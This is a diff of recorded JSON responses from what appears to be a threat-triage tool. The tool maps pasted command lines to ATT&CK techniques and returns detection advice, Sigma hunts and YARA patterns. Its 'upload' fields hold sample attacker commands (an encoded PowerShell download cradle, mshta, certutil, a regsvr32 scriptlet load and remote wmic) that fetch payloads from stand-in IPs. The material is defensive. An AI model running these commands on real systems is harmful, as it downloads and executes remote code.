@@ -214,7 +214,7 @@
               }
             ]
           },
-          "elapsed_ms": 158.6,
+          "elapsed_ms": 163.4,
           "status": 200
         },
         "die": {
@@ -522,22 +522,62 @@
               ]
             }
           },
-          "elapsed_ms": 150.7,
+          "elapsed_ms": 111.6,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "3 technique(s) observed (T1027, T1564.003, T1562.001). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "overall_assessment": {
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1562.001] Alert on `Set-MpPreference -DisableRealtimeMonitoring`, `sc stop WinDefend`, `reg add ... EnableLUA=0`, and any modification of `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender`.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\""
+              ]
             }
           },
-          "elapsed_ms": 109.0,
+          "elapsed_ms": 118.2,
           "status": 200
         },
         "upload": {
@@ -565,7 +605,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 197.9,
+          "elapsed_ms": 107.4,
           "status": 200
         }
       },
@@ -653,7 +693,7 @@
               }
             ]
           },
-          "elapsed_ms": 156.7,
+          "elapsed_ms": 170.9,
           "status": 200
         },
         "die": {
@@ -961,22 +1001,62 @@
               ]
             }
           },
-          "elapsed_ms": 150.5,
+          "elapsed_ms": 109.1,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1562.001` (Impair Defenses: Disable or Modify Tools).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.001). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "3 technique(s) observed (T1027, T1564.003, T1562.001). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "overall_assessment": {
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1562.001] Alert on `Set-MpPreference -DisableRealtimeMonitoring`, `sc stop WinDefend`, `reg add ... EnableLUA=0`, and any modification of `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender`.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: powershell Set-MpPreference OR reg.exe modifying `\\Windows Defender\\DisableAntiSpyware`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"sc stop WinDefend\""
+              ]
             }
           },
-          "elapsed_ms": 94.6,
+          "elapsed_ms": 101.5,
           "status": 200
         },
         "upload": {
@@ -1004,7 +1084,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 140.7,
+          "elapsed_ms": 100.8,
           "status": 200
         }
       }
@@ -1184,7 +1264,7 @@
               }
             ]
           },
-          "elapsed_ms": 8311.8,
+          "elapsed_ms": 3913.0,
           "status": 200
         },
         "die": {
@@ -1369,22 +1449,41 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 99.6,
+          "elapsed_ms": 96.6,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1218.005` (T1218.005).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1218.005). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 1 MITRE ATT&CK technique(s) mapped across 1 tactic(s): **Defense Evasion** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Evade EDR / AV detection"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
+              "overall_assessment": {
+                "attack_progress_pct": 28,
+                "confidence": "Low",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
               "sigma_hunts": [],
               "threat_actor_context": "",
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.6,
+          "elapsed_ms": 97.0,
           "status": 200
         },
         "upload": {
@@ -1412,7 +1511,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 115.9,
+          "elapsed_ms": 113.8,
           "status": 200
         }
       },
@@ -1486,7 +1585,7 @@
               }
             ]
           },
-          "elapsed_ms": 1335.4,
+          "elapsed_ms": 2101.1,
           "status": 200
         },
         "die": {
@@ -1671,22 +1770,41 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 100.7,
+          "elapsed_ms": 98.0,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1218.005` (T1218.005).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1218.005). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 1 MITRE ATT&CK technique(s) mapped across 1 tactic(s): **Defense Evasion** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Evade EDR / AV detection"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
+              "overall_assessment": {
+                "attack_progress_pct": 28,
+                "confidence": "Low",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
               "sigma_hunts": [],
               "threat_actor_context": "",
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 109.5,
+          "elapsed_ms": 105.6,
           "status": 200
         },
         "upload": {
@@ -1714,7 +1832,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 196.4,
+          "elapsed_ms": 129.9,
           "status": 200
         }
       }
@@ -1919,7 +2037,7 @@
               }
             ]
           },
-          "elapsed_ms": 1357.5,
+          "elapsed_ms": 1335.1,
           "status": 200
         },
         "die": {
@@ -2139,13 +2257,13 @@
               ]
             }
           },
-          "elapsed_ms": 110.6,
+          "elapsed_ms": 101.5,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1140` (T1140). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -2159,26 +2277,47 @@
                   "title": "Stage 1 \u2014 certutil \u00b7 -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1140). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 103.4,
+          "elapsed_ms": 107.4,
           "status": 200
         },
         "upload": {
@@ -2206,7 +2345,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 114.7,
+          "elapsed_ms": 98.6,
           "status": 200
         }
       },
@@ -2289,7 +2428,7 @@
               }
             ]
           },
-          "elapsed_ms": 1065.6,
+          "elapsed_ms": 1574.9,
           "status": 200
         },
         "die": {
@@ -2509,13 +2648,13 @@
               ]
             }
           },
-          "elapsed_ms": 202.8,
+          "elapsed_ms": 100.4,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1140` (T1140). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -2529,26 +2668,47 @@
                   "title": "Stage 1 \u2014 certutil \u00b7 -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1140). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 36,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 204.8,
+          "elapsed_ms": 103.0,
           "status": 200
         },
         "upload": {
@@ -2576,7 +2736,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 104.9,
+          "elapsed_ms": 113.4,
           "status": 200
         }
       }
@@ -2765,7 +2925,7 @@
               }
             ]
           },
-          "elapsed_ms": 1635.1,
+          "elapsed_ms": 1324.4,
           "status": 200
         },
         "die": {
@@ -3017,13 +3177,13 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 101.7,
+          "elapsed_ms": 102.5,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1218.010` (Regsvr32).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -3037,26 +3197,40 @@
                   "title": "Stage 1 \u2014 regsvr32 \u00b7 /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1218.010). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 1 MITRE ATT&CK technique(s) mapped across 1 tactic(s): **Defense Evasion** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
+                "attack_progress_pct": 28,
                 "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1218.010] Alert on `regsvr32.exe` invocations with `/i:` HTTP URLs (Squiblydoo) or `/u /s /n` scriptlet inclusion; block SCT downloads at the proxy.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process regsvr32.exe command_line contains any_of (`/i:http`, `/i:\\\\\\\\`, `scrobj.dll`)"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: regex /regsvr32.*\\/i:https?:\\/\\//i"
+              ]
             }
           },
-          "elapsed_ms": 141.7,
+          "elapsed_ms": 99.5,
           "status": 200
         },
         "upload": {
@@ -3084,7 +3258,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 130.8,
+          "elapsed_ms": 142.6,
           "status": 200
         }
       },
@@ -3165,7 +3339,7 @@
               }
             ]
           },
-          "elapsed_ms": 1103.3,
+          "elapsed_ms": 1925.2,
           "status": 200
         },
         "die": {
@@ -3417,13 +3591,13 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 127.5,
+          "elapsed_ms": 100.5,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Defense Evasion** the analyst observed `T1218.010` (Regsvr32).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -3437,26 +3611,40 @@
                   "title": "Stage 1 \u2014 regsvr32 \u00b7 /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1218.010). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 1 MITRE ATT&CK technique(s) mapped across 1 tactic(s): **Defense Evasion** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Evade EDR / AV detection"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
+                "attack_progress_pct": 28,
                 "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[T1218.010] Alert on `regsvr32.exe` invocations with `/i:` HTTP URLs (Squiblydoo) or `/u /s /n` scriptlet inclusion; block SCT downloads at the proxy.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: process regsvr32.exe command_line contains any_of (`/i:http`, `/i:\\\\\\\\`, `scrobj.dll`)"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: regex /regsvr32.*\\/i:https?:\\/\\//i"
+              ]
             }
           },
-          "elapsed_ms": 103.2,
+          "elapsed_ms": 107.2,
           "status": 200
         },
         "upload": {
@@ -3484,7 +3672,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 139.8,
+          "elapsed_ms": 103.8,
           "status": 200
         }
       }
@@ -3762,7 +3950,7 @@
               }
             ]
           },
-          "elapsed_ms": 1657.1,
+          "elapsed_ms": 2291.3,
           "status": 200
         },
         "die": {
@@ -4167,13 +4355,13 @@
               ]
             }
           },
-          "elapsed_ms": 150.2,
+          "elapsed_ms": 117.6,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell), `T1059.003` (Windows Command Shell), `T1047` (T1047). During **Defense Evasion** the analyst observed `T1564.003` (Hide Artifacts: Hidden Window). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -4187,26 +4375,63 @@
                   "title": "Stage 1 \u2014 wmic \u00b7 /node:\"WORKSTATION-04\" process call create \"cmd.exe /c power"
                 }
               ],
-              "behavior_summary": [],
-              "executive_summary": "The paste yielded 1 analyst-observable stages. Stages were extracted deterministically from the input \u2014 no LLM narration is used.",
+              "behavior_summary": [
+                {
+                  "activity": "3 technique(s) observed (T1059.001, T1059.003, T1047). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 6 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (3 tech.), **Defense Evasion** (1 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
-                "Objective unclear \u2014 insufficient signal in the paste."
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 10,
-                "confidence": "Low",
-                "primary_objective": "Reconnaissance / Post-exploitation",
-                "risk": "Low"
+                "attack_progress_pct": 45,
+                "confidence": "High",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
               },
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
+                "[T1059.003] Baseline legitimate `cmd.exe` invocations from LOB apps; alert on cmd.exe child processes spawned by Office / browser / Outlook.",
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
+              ],
+              "sigma_hunts": [
+                "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
+                "Sigma: parent_image ends_with (`winword.exe`, `excel.exe`, `outlook.exe`, `acrord32.exe`, `chrome.exe`) AND child_image ends_with `cmd.exe`",
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
+                "YARA: string \"cmd.exe /c\" combined with office suite parent process",
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 120.0,
+          "elapsed_ms": 140.8,
           "status": 200
         },
         "upload": {
@@ -4234,7 +4459,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 131.2,
+          "elapsed_ms": 267.4,
           "status": 200
         }
       },
@@ -4364,7 +4589,7 @@
               }
             ]
           },
-          "elapsed_ms": 961.4,
+          "elapsed_ms": 8469.1,
           "status": 200
         },
         "die": {
@@ -4769,13 +4994,13 @@
               ]
             }
           },
-          "elapsed_ms": 122.9,
+          "elapsed_ms": 108.6,
           "status": 200
         },
         "narrate": {
